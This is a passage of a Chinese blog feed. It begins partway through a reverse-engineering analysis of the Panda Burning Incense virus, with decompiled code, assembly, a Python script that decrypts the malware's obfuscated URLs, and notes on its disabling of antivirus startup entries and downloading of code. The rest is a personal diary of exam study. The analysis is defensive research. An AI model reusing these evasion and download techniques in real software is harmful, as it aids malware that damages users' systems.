class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)&amp;savedregs;<br>  v8[<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)&amp;loc_40C5C1;<br>  v8[<span class="hljs-number">0</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)NtCurrentTeb()-&gt;NtTib.ExceptionList;<br>  __writefsdword(<span class="hljs-number">0</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v8);<br>  <span class="hljs-keyword">if</span> ( encryp_url )<br>  &#123;<br>    System::__linkproc__ <span class="hljs-title function_">LStrLAsg</span><span class="hljs-params">(&amp;v10, aXboy)</span>; <span class="hljs-comment">// &quot;xboy&quot;</span><br>    System::__linkproc__ <span class="hljs-title function_">LStrClr</span><span class="hljs-params">(&amp;v11)</span>;         <span class="hljs-comment">// 申请一个字符串空间</span><br>    v5 = unknown_libname_113(encryp_url);       <span class="hljs-comment">// 加密url的长度</span><br>    <span class="hljs-keyword">if</span> ( v5 &gt; <span class="hljs-number">0</span> )<br>    &#123;<br>      v6 = <span class="hljs-number">1</span>;<br>      <span class="hljs-keyword">do</span><br>      &#123;<br>        unknown_libname_113(v10);               <span class="hljs-comment">// &quot;xboy&quot;的长度4</span><br>        unknown_libname_108((<span class="hljs-type">int</span>)&amp;v9);<br>        System::__linkproc__ <span class="hljs-title function_">LStrCat</span><span class="hljs-params">(&amp;v11, v9)</span>;<br>        ++v6;<br>        --v5;<br>      &#125;<br>      <span class="hljs-keyword">while</span> ( v5 );<br>    &#125;<br>    System::__linkproc__ <span class="hljs-title function_">LStrAsg</span><span class="hljs-params">(v12, v11)</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    System::__linkproc__ LStrClr(v12);<br>  &#125;<br>  __writefsdword(<span class="hljs-number">0</span>, v8[<span class="hljs-number">0</span>]);<br>  System::__linkproc__ <span class="hljs-title function_">LStrArrayClr</span><span class="hljs-params">(&amp;loc_40C5C8)</span>;<br>  <span class="hljs-keyword">return</span> System::__linkproc__ LStrClr(&amp;encryp_url);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs assembly">seg000:0040C550                 call    unknown_libname_113 ; BDS 2005-2007 and Delphi6-7 Visual Component Library<br>seg000:0040C550                                         ; Delphi 5 Visual Component Library<br>seg000:0040C555                 push    eax<br>seg000:0040C556                 mov     eax, ebx<br>seg000:0040C558                 pop     edx<br>seg000:0040C559                 mov     ecx, edx<br>seg000:0040C55B                 cdq<br>seg000:0040C55C                 idiv    ecx<br>seg000:0040C55E                 mov     edi, edx<br>seg000:0040C560                 inc     edi<br>seg000:0040C561                 mov     eax, [ebp+var_10]<br>seg000:0040C564                 movzx   eax, byte ptr [eax+edi-1]<br>seg000:0040C569                 mov     ecx, 0Ah<br>seg000:0040C56E                 xor     edx, edx<br>seg000:0040C570                 div     ecx<br>seg000:0040C572                 mov     eax, [ebp+encryp_url]<br>seg000:0040C575                 movzx   eax, byte ptr [eax+ebx-1]<br>seg000:0040C57A                 xor     edx, eax<br>seg000:0040C57C                 lea     eax, [ebp+var_14]<br></code></pre></td></tr></table></figure><p>给出python的解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">key = <span class="hljs-string">&quot;xboy&quot;</span><br>encrypt_data = <br>decode_data = []<br>magic_num = <span class="hljs-number">10</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(encrypt_data)):<br>    decode_data.append(<span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(key[(i+<span class="hljs-number">1</span>)%<span class="hljs-number">4</span>]) % magic_num) ^ encrypt_data[i]))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(decode_data))<br></code></pre></td></tr></table></figure><h3 id="sub-40d048"><a href="#sub-40d048" class="headerlink" title="sub_40d048"></a>sub_40d048</h3><p>创建两个线程，第一个和sub_40d040一样；第二个则是关闭网络共享</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251002171719.png"></p><h4 id="sub-40cdec"><a href="#sub-40cdec" class="headerlink" title="sub_40cdec"></a>sub_40cdec</h4><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251002171851.png"></p><h3 id="sub-407430"><a href="#sub-407430" class="headerlink" title="sub_407430"></a>sub_407430</h3><p>套娃</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251002172012.png"></p><p>停止、删除windwos服务，删除杀软启动项</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251002173433.png"></p><h3 id="sub-40cc4c"><a href="#sub-40cc4c" class="headerlink" title="sub_40cc4c"></a>sub_40cc4c</h3><p>访问几个常见网站</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251002173614.png"></p><h3 id="sub-40c728"><a href="#sub-40c728" class="headerlink" title="sub_40c728"></a>sub_40c728</h3><p>同样的下载恶意代码并执行，就是url不一样</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251002173828.png"></p><h3 id="具体流程-2"><a href="#具体流程-2" class="headerlink" title="具体流程"></a>具体流程</h3><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251002175446.png"></p><h2 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h2><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/xiongmao.vir.png"></p><h1 id="0xff-写在最后"><a href="#0xff-写在最后" class="headerlink" title="0xff.写在最后"></a>0xff.写在最后</h1><p>笔者花了两天时间，粗略的把这个老古董给分析了一下</p><p>挺有意思的，“小而精致”用来评价熊猫烧香鼠鼠觉得没啥大问题</p><p>同时笔者也有借口两天不看行测申论这种ex玩意了😋</p><p>还是喜欢这种兴趣主导的学习😭😭😭😭</p><p>但是鼠鼠还是没解决怎么5.0的火绒剑一跑就崩的问题👊</p><h1 id="Refer"><a href="#Refer" class="headerlink" title="Refer"></a>Refer</h1><p><a href="https://www.52pojie.cn/thread-1569939-1-1.html">经典病毒分析——熊猫烧香 - 吾爱破解 - 52pojie.cn</a></p><p><a href="https://github.com/Korey0sh1/xiongmao/blob/main/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99_analysis.zip">xiongmao&#x2F;熊猫烧香_analysis.zip at main · Korey0sh1&#x2F;xiongmao</a>笔者把文件打包好了😋</p>]]></content>
    
    
    <categories>
      
      <category>Virus_Analysis</category>
      
    </categories>
    
    
    <tags>
      
      <tag>忙里偷闲</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2025八月记</title>
    <link href="/2025/08/31/2025-08/"/>
    <url>/2025/08/31/2025-08/</url>
    
    <content type="html"><![CDATA[<h1 id="8月"><a href="#8月" class="headerlink" title="8月"></a>8月</h1><h3 id="8-4-周一"><a href="#8-4-周一" class="headerlink" title="8.4 周一"></a>8.4 周一</h3><p>冲刺第一天 </p><p><strong>行测：</strong></p><p>资料分析 13&#x2F;20 ；言语1 10&#x2F;12；言语2  7&#x2F;12。做完后听了花生的解析，收获很多。做了点小笔记</p><p><strong>申论：</strong></p><p>写了20联考的1（加强社会治安）、2（无讼）、3（义警），感觉还行</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_2025-08-04_230323_934.png" style="zoom: 25%;" /><h3 id="8-5-周二"><a href="#8-5-周二" class="headerlink" title="8.5 周二"></a>8.5 周二</h3><p>冲刺第二天 </p><p><strong>行测：</strong></p><p>言语 8&#x2F;12；资料1 16&#x2F;20；资料2 12&#x2F;20； 资料3 15&#x2F;20。言语做的都是语段，要做到在题目上把层次划分出来；资料现在感觉全是题目审题和计算的真是草了。</p><p><strong>申论：</strong></p><p>20公安联考大作文（与民同心，共创和谐）。第一次写申论大作文，基本上是套钟言的思路写的，3年没写议论文，感觉写的一坨</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250805230929_8.jpg" style="zoom:25%;" /><h3 id="8-6-周三"><a href="#8-6-周三" class="headerlink" title="8.6 周三"></a>8.6 周三</h3><p><strong>行测：</strong></p><p>粉笔27季模考副省级 62.3分。做的一坨稀烂。图推烂完了，10道只对了2个，言语也有点差。数量一如既往的来不及，资料看起来前几天的刷题还是有效果的。</p><p>复盘之后总结了一下：言语不要纠结，是为了做题（感觉真不如相信直觉）！注重前后对应，文段要读完！图推烂完了等我刷题刷好再说；资料还是计算问题，能不能补药算错了球球了😭😭😭</p><p>接下来就是图推、资料、言语里的片段阅读刷题，接着背花生言语700词。</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250831225607.png"></p><p><strong>申论：</strong></p><p>钟言大作文谋篇布局二刷，打算大作文的课看完之后自己写一篇大作文。</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/8a7c9e20d75b414ef623e54959ebd3c4.jpg" style="zoom:25%;" /><h3 id="8-7-周四"><a href="#8-7-周四" class="headerlink" title="8.7 周四"></a>8.7 周四</h3><p><strong>行测：</strong></p><p>言语：言语1 9&#x2F;12；言语2 10&#x2F;12；分段法划分前后对策、前后观点、转折、引出这些还是挺有用的，遇到纠结的地方还是要放空🧠，回归本能👊。手头上纸质的片段阅读理解做完了，现在打算把700词看完去刷沟槽的词义辨析。</p><p>资料：资料1 19&#x2F;20；好起来了家人们，就是时间花的有点长，方法速算什么的要再改进一下。</p><p>判断：今天主要看了图推，惨败而归真的草了。归结了一下立体图的三个考点——截面，展开，构成，学习了马走双日、分层几个方法，收获很大。可惜的是没纸质的刷题资料，明天开始每天20道图推狠狠干。</p><p><strong>申论：</strong></p><p>看课，没什么好说的</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/5a25def994ff35469da3d731b022be72.jpg" style="zoom:25%;" /><h3 id="8-8-周五"><a href="#8-8-周五" class="headerlink" title="8.8 周五"></a>8.8 周五</h3><p><strong>行测：</strong></p><p>资料：资料1 15&#x2F;20；资料2 17&#x2F;20；时间是短了，但是正确率也下去了，md。学到了资料中原来也有<strong>容斥问题</strong>。还是要注意<strong>首年</strong>问题以及题干审题，这个时间不能省（我真是个sb）。</p><p>判断：图推——立体图 20&#x2F;20；图推综合 8&#x2F;10。真是神奇，20道立体图全对，2道蒙A的对了卧槽。后来综合一个截面图傻逼了，然后一个数横竖没反应过来。</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/e9fad1af867ecb3a308da90ed38c8871.png"></p><p>言语：看花生700词中。。。</p><p><strong>申论：</strong></p><p>听老钟分析20年的联考卷子，喜提51分，我操了真的要没班上了。</p><p>第一题概括归纳：没找准撮要，写了一半的措施效果。。。</p><p>第二题启示：直接裂开，启示是共性中找特性，审题也有点问题</p><p>第三题：审题漏了注意”创建队伍“，导致全文回答少了这一大点</p><p>大作文：事例论证不够丰富。审题中也没怎么注意“结合给定资料”</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250808235131_13.jpg" style="zoom:25%;" /><h3 id="8-9-周六"><a href="#8-9-周六" class="headerlink" title="8.9 周六"></a>8.9 周六</h3><p>放空一天，雀魂启动！</p><h3 id="8-10-周日"><a href="#8-10-周日" class="headerlink" title="8.10 周日"></a>8.10 周日</h3><p><strong>行测：</strong></p><p>粉笔第29季 行政执法卷模考 70.5分；看来刷题是有效果的！继续努力！</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/188e8db53b327523488bb4181015b9cb.jpg"></p><p>政治理论：不说了，全蒙C是对的！</p><p>常识：麻了，什么时候能提到70%正确率</p><p>言语：这次言语正确率到了80%！花生的700词背着是真的有效果的！继续背！</p><p>数量：做了5题，对了4题，蒙对了1题，还要继续加油！</p><p>判断：wcnm司马图推，花了15分钟有的，结果4&#x2F;10🤡🤡；开来是真要淦你了</p><p>资料：这次资料非常简单！但是我还是犯了2个计算错误！</p><p>总的来说从上周第一次模考的54.3提升70.5，继续加油！看安神复盘学到了很多！</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250810233038_14.png" style="zoom:25%;" /><h3 id="8-11-周一"><a href="#8-11-周一" class="headerlink" title="8.11 周一"></a>8.11 周一</h3><p>路路来越城了，很难得，于是中午和孟老师、乐宝、太君他们恰饭</p><p>下午本来想去桌游馆结果搬地方了，那只能杭麻启动！</p><p>晚上回来看花生言语700词，看了快2&#x2F;3了</p><h3 id="8-12-周二"><a href="#8-12-周二" class="headerlink" title="8.12 周二"></a>8.12 周二</h3><p><strong>行测：</strong></p><p>资料：练习一 12&#x2F;20 44min；我敲你的，这篇纯纯究极爆炸计算量和脑瘫题，外加我也脑瘫，草了；练习二 18&#x2F;20 30min；这篇就简单多了，错了一个整体的范围理解错误。</p><p>判断：还是继续图推，练习一 9&#x2F;10 10min27s；练习二 9&#x2F;10 13min；感觉不错，但不知道为什么，联系的时候做的挺顺的，模考的时候脑子一片空白😰。</p><p>言语：继续看700词，估计明天能看完；片段阅读练习一 15&#x2F;20，要注意语段里有对策之类的要注意，抛弃纠结，遵从第一感觉！</p><p><strong>申论：</strong></p><p>21国考申论真题改定 第1（概括归纳：村寨银行）、2（综合分析：“种戏”）、3（演讲提纲：清河社区）题，有种说不出来的感觉，除了抄材料什么都不会，治国理政知识点的感觉一个都没有。。。</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250812232335_16.jpg" style="zoom:25%;" /><h3 id="8-13-周三"><a href="#8-13-周三" class="headerlink" title="8.13 周三"></a>8.13 周三</h3><p><strong>行测</strong></p><p>黑暗的一天，粉笔 26季模考 行政执法 63.2 大败而归</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250813233305.png" style="zoom:25%;" /><p>资料：14&#x2F;20 花费31min，我真tm是个sb啊。第一题混合增长率判断错误；第二题题目太绕了没理解对；第三题又忘了首年；第四题题目漏看了一个增量；第五题纯盲人；第6题间隔增长率算错，啊啊啊啊啊。看安子复盘，尼玛又学到了一个邪修方法，等遇到了试试。平时练习要强迫自己扔笔了感觉，好多题都能纯粹的用所给的题干和选项判断出来，不能一直计算了。</p><p>数量关系：6&#x2F;10；没什么好说的，多做！</p><p>判断推理：这次图推9&#x2F;10，错的那个还是选项选错了。。。有进步！定义和类比错了6个，但我觉得是这次的题解释有点牵强；一拖五错了一个，可以接受</p><p>言语：选词13&#x2F;15，继续背700词，有用！后面错了4道，还是犯了经常的没选对策，自我脑补的问题</p><p>政治理论和常识再议。。。</p><p><strong>申论：</strong></p><p>21国考申论真题改定——大作文：以“‘治’慧”为题，谈谈“物无妄然，必由其理”对提升治理效能的深刻启示。</p><p>额，不会写，等解析，楽</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_2025-08-13_235535_887.png" style="zoom:25%;" /><h3 id="8-14-周四"><a href="#8-14-周四" class="headerlink" title="8.14 周四"></a>8.14 周四</h3><p><strong>行测：</strong></p><p>判断推理：图推练习1 8&#x2F;10，一个从右向左推的黑白求异没看出来，还有题我觉得不是很严谨；图推练习2 9&#x2F;10，错了一个正方体展开，光颅内想象了，没画图。</p><p>言语：700词完结， 成语填空练习一 11&#x2F;15；练习二 9&#x2F;15； 练习三 10&#x2F;15。感觉题比较难，很多都是二选一不确定，还得多练。奇怪的是套卷模考的时候正确率还挺高🤔</p><p>资料：做了一套 17&#x2F;20，尝试着有些题不靠计算，但是错了一道肉眼观察法失败的，可惜，还错了一道计算错误和一道理解有误。</p><p><strong>公专：</strong></p><p>波波2.14录播课，内容：袭警、人民警察职业道德规范、全国公安工作会议、全国公安厅局长会议、新质生产力</p><p>波波3.06录播课，内容：公安机关办理行政案件程序规定第一至第七章第三节（询问）。快速过了一遍知识点，死去的记忆又在攻击我bushi。</p><p><strong>申论：</strong></p><p>感觉小马哥的申论更适合我的亚子🤔</p><p>冲冲冲！</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250814234518_22.png" style="zoom:25%;" /><h3 id="8-15-周五"><a href="#8-15-周五" class="headerlink" title="8.15 周五"></a>8.15 周五</h3><p><strong>行测：</strong></p><p>判断推理：图推练习一8&#x2F;10，练习二8&#x2F;10，总体还可以；</p><p>资料：18&#x2F;20，但花了38分钟，造孽啊。好几道计算量大的题虽然都暴力算做对了，但是看了解析才发现可以用盐水、混合增长率等方法先定性分析，排除两个错误选项，然后将剩余两个选项代一排一，这样至少能节省10min有的。还是对技巧太不敏感了。</p><p>言语：15&#x2F;20，都错在没有依据上下文对应的思路。</p><p><strong>公专：</strong></p><p>波波3.13录播课，内容：《公安机关办理行政案件程序规定》第七章第三节至第七章第八节（办案协作）；《公安机关接报案与立案工作规定》；“三个当场” ——当场进行网上接报案登记，当场接受证据材料、当场出具回执并告知查询案件进展情况、投诉举报监督的方式和途径；《公安机关适用行政处罚若干问题的指导意见》</p><p><strong>申论：</strong></p><p>21国考卷【改】复盘：前三题没啥问题，理解都对的，就是要点没有概括到位，外加用自己的语言写撮要了，应该直接用材料里的。大作文“‘治’慧”的审题出了点问题，我的理解是顺应规律——&gt;顺应民意，结果老钟给出的解析是顺应规律——&gt;顺应4个材料里总结的规律（自然、市场、文化、城市、以人为本、因地制宜这些）；外加事实论证的运用还不是很到位，且运用事实论证后没有加对策论点，需要改正</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_2025-08-15_232824_777.png" style="zoom:25%;" /><h3 id="8-16-周六"><a href="#8-16-周六" class="headerlink" title="8.16 周六"></a>8.16 周六</h3><p>躺了一天，真舒服😋</p><h3 id="8-17-周日"><a href="#8-17-周日" class="headerlink" title="8.17 周日"></a>8.17 周日</h3><p><strong>行测：</strong></p><p>第三次模考，瓦达西，鼠鼠の政治理论、常识、资料是不是出了什么问题，真草了</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250818095904.png"></p><p>政治理论&amp;常识：nm还没学，哪凉快哪呆着去</p><p>言语：逐渐步入正轨，继续保持</p><p>数量：可惜，做了8道，蒙了两道d，要是蒙C就全对了</p><p>判断：图推还可以精进一下</p><p>资料：我真的草了，看了一下错的8道里有6道题目看错了，尼玛尼玛尼玛尼玛尼玛尼玛尼玛尼玛尼玛尼玛尼玛尼玛尼玛尼玛尼玛</p><h3 id="8-18-8-24"><a href="#8-18-8-24" class="headerlink" title="8.18 - 8.24"></a>8.18 - 8.24</h3><p>莫名奇妙🐏了，三天高烧+两天低烧+两天摆子，属实是给我摆爽了</p><p>周五晚上做了个藏蓝网的行测模考。</p><p>第一次真实的联考套卷，两个感悟：一，直觉得练，这个分必须拿；二，数量和资料时间是真不够，要定时间刷了</p><p>喜提藏蓝网院校第三，生源地第七</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250824222446.png">周日做了第31季的模考，又大败而归了</p><p>政治理论：不说了，我的觉悟，哎</p><p>常识：这次法律常识错少了，生活文学常识全挂，草了</p><p>言语：选词错太多，果然长时间不做题，语感都没了</p><p>数量：资料时间花的太长，没时间做了</p><p>判断：这次图推错了4个，别的定义推断全是长难句，也花了好长时间</p><p>资料：正确率还行，但花的时间实在是太多了</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250824222658.png"></p><h3 id="8-25-周一"><a href="#8-25-周一" class="headerlink" title="8.25 周一"></a>8.25 周一</h3><p><strong>行测</strong>：</p><p>直觉：53&#x2F;60 ，得分 7.92&#x2F;10，做错倒扣是真的烦，还得练。寻找词语元素的那个还是做的太慢了</p><p>判断推理：图推一 10&#x2F;10 8分35秒，图推二 8&#x2F;10 11分49秒；今天题还算简单</p><p>资料：16&#x2F;20 26分钟，一题范围看错，一题年份看错，真的是盲人考公，然后有个算增长量，因为R小于5%，我直接乘了，没想到给的选项误差太小，，直接错两题。。。</p><p>言语：片段阅读15&#x2F;20 18分钟；好几个错选都犯了无中生有的毛病。。。</p><p><strong>公专：</strong></p><p>刑法</p><p><strong>申论：</strong></p><p>25国考申论真题副省级1、2、3题，什么sb题目，一点不会写</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250825233608_26_294.png" style="zoom:25%;" /><h3 id="8-26-周二"><a href="#8-26-周二" class="headerlink" title="8.26 周二"></a>8.26 周二</h3><p><strong>行测：</strong></p><p>做了学校中公的模考，奶奶的，怎么模考资料题目加载不出来，还莫名闪退，做了还不知道成绩，说是要后能才能机改，额。</p><p>直觉：56&#x2F;60 错3 没做1，一点点提升！</p><p>图推：9&#x2F;10 错了一个很逆天的题</p><p><strong>申论：</strong></p><p>25国考申论真题副省级4、5题，大作文探讨主观能动性对于矛盾转化的作用，还算好写🤔</p><p><strong>公专：</strong></p><p>波波的录播听了两节，算是把刑法分则给搞完了</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250826230218_27_294.jpg" style="zoom:25%;" /><h3 id="8-27-周三"><a href="#8-27-周三" class="headerlink" title="8.27 周三"></a>8.27 周三</h3><p><strong>行测：</strong></p><p>直觉：52&#x2F;60 错8道，nmb，这个选出现几个词语的是真的司马了</p><p>资料：18&#x2F;20 30分钟；速度需要提上去！</p><p>数量： 9&#x2F;10 14分53秒，感觉是粉笔的题很简单的缘故🤔</p><p>言语：片段阅读 12&#x2F;20，真司马了，牢记有对策选对策，tmd</p><p>图推：练习一 7&#x2F;10；练习二 6&#x2F;10；今天图推也跟sm了一样。一道黑块分开看对称，一道九宫格米字型构图，出题思路来源是河图洛书，捏马马滴。</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250827152853.png" style="zoom:25%;" /><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250827152931.png" style="zoom:25%;" /><p><strong>公专：</strong></p><p>波波《人民警察使用警械和武器条例》+《行政法与行政诉讼法》</p><p><strong>申论：</strong></p><p>小马哥概括归纳理论完结，收获很多</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250827234730_37_294.jpg" style="zoom:25%;" /><h3 id="8-28-周四"><a href="#8-28-周四" class="headerlink" title="8.28 周四"></a>8.28 周四</h3><p><strong>行测：</strong></p><p>判断推理：图推一 8&#x2F;10 10分50秒；图推二 8&#x2F;10 12分23秒；还行</p><p>直觉：54&#x2F;60 错5道，没做1道</p><p>数量：8&#x2F;10 17分8秒；草，错的两道都是忘算最后一步了，妈妈生的</p><p>言语：17&#x2F;20；今天状态还不错</p><p>资料：18&#x2F;20 24分34秒；还行今天，有道题可以使用乘积增长率的邪修方法，涨姿势了</p><p><strong>公专：</strong></p><p>民法典+民法</p><p><strong>申论：</strong></p><p>小马哥综合分析1+2</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250828234240_38_294.jpg" style="zoom:25%;" /><h3 id="8-29-周五"><a href="#8-29-周五" class="headerlink" title="8.29 周五"></a>8.29 周五</h3><p><strong>行测：</strong></p><p>直觉：57&#x2F;60 ，错3道，还行</p><p>判断推理：图推练习一，8&#x2F;10 8分37秒；图推练习二，7&#x2F;10，13分42秒；对于直角这类关系还不是很敏感</p><p>数量：9&#x2F;10 20分钟；最后留了道排列组合花了5分钟还做错了。。答案还tm是C，要是考试我绝壁蒙对了👊</p><p>资料：17&#x2F;20 23分40秒；日了狗了，一道题干里数据找错了，一道眼瞎，一道草稿纸上24%抄成34%了。</p><p>言语：片段阅读15&#x2F;20，有点狗屎</p><p><strong>申论：</strong></p><p>重写25国考申论真题副省级第2题</p><p>小马哥申论综合分析完结</p><p><strong>公专：</strong></p><p>波波新版监察法+执法规范及警情处置（一）（二）</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250829233724_49_294.png" style="zoom:25%;" /><h3 id="8-30-周六"><a href="#8-30-周六" class="headerlink" title="8.30 周六"></a>8.30 周六</h3><p>休息日！鸣潮2.6真好玩😋，尤诺真好看呜呜呜</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250831225343.png" style="zoom:50%;" /><h3 id="8-31-周日"><a href="#8-31-周日" class="headerlink" title="8.31 周日"></a>8.31 周日</h3><p><strong>行测：</strong></p><p>又来到了每周的粉笔模考时间！捏马马滴一看分数还挺开心，一看排名什么屌玩意，比上次还退步了草</p><p>ps：谢老师晚上略微出手80分，把我当🐓鲨</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250831220328.png"></p><p>政治理论：捏马滴，可以把我毙了</p><p>常识：你别说公专学起来行政执法的前几道法律常识能对几道，第一次正确率过50😀</p><p>言语：这次言语很简单，but我选词只有10&#x2F;15，byd5个二选一全错，这是怎么回事呢🤔</p><p>数量：很奇怪，模考一遇到和差倍比、排列组合脑子就一团浆糊，草了</p><p>判断：图推8&#x2F;10，还能接受，md有个点错正确答案了；逻辑判断连错3个，测了我都不知道怎么回事</p><p>资料：额本来能全队的，排序题顺序排反了；第一套题第二张表看都没看到，怪不得有一道题没找到数据🤡👊</p><p>怎么办啊，真的淦了</p><p><strong>公专：</strong></p><p>波波的治安管理处罚法 The latest version!</p><p>捏麻麻滴，怎么要重新背，早不改晚不改，偏偏鼠鼠考试这年改</p><p>👊👊👊</p><p><strong>申论：</strong></p><p>25年的副省卷1-4题复盘，大作文留明天</p><p>批出来的分数我自己都想笑</p><p>仔细看了看发现好几题理解方面都有点问题</p><p>比如三条黄河，协同治理，我理解成一定要体现原型、数字、模型三个加在一起才算。。。</p><p>还有今州粮仓的宣传稿，我重点全在“前世今生”如何改造了，没意识到展板稿子的特性</p><p>哎，捏吗滴那帮排行榜上70+的人怎么写出来的</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250831224118_50_294.png" style="zoom:25%;" /><h1 id="小记"><a href="#小记" class="headerlink" title="小记"></a>小记</h1><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250831224416_51_294.jpg" style="zoom:25%;" /><p>哎，遥想上次这么学还是在高中</p><p>这三年真的好久没坐下来认真动笔看书了</p><p>8月就这么过去了，nmd时间真的过的好快啊</p><p><strong>9月目标</strong></p><ul><li>争取行测模考稳75冲80，是时候开政治理论+常识了</li><li>公专知识点还差一点，过完后可以开刷波波的模拟题了</li><li>申论，哎，好好写吧😭</li></ul>]]></content>
    
    
    <categories>
      
      <category>shell之外</category>
      
    </categories>
    
    
    <tags>
      
      <tag>碎碎念</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>koreyの冲刺日记</title>
    <link href="/2025/06/03/korey%E3%81%AE%E5%86%B2%E5%88%BA%E6%97%A5%E8%AE%B0/"/>
    <url>/2025/06/03/korey%E3%81%AE%E5%86%B2%E5%88%BA%E6%97%A5%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="161c8df2997d2cadf584dd58abd1356ece257b516dab89ab4dc841d8f0ad685e"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>shell之外</category>
      
    </categories>
    
    
    <tags>
      
      <tag>碎碎念</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>致逝去的2024</title>
    <link href="/2025/01/03/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
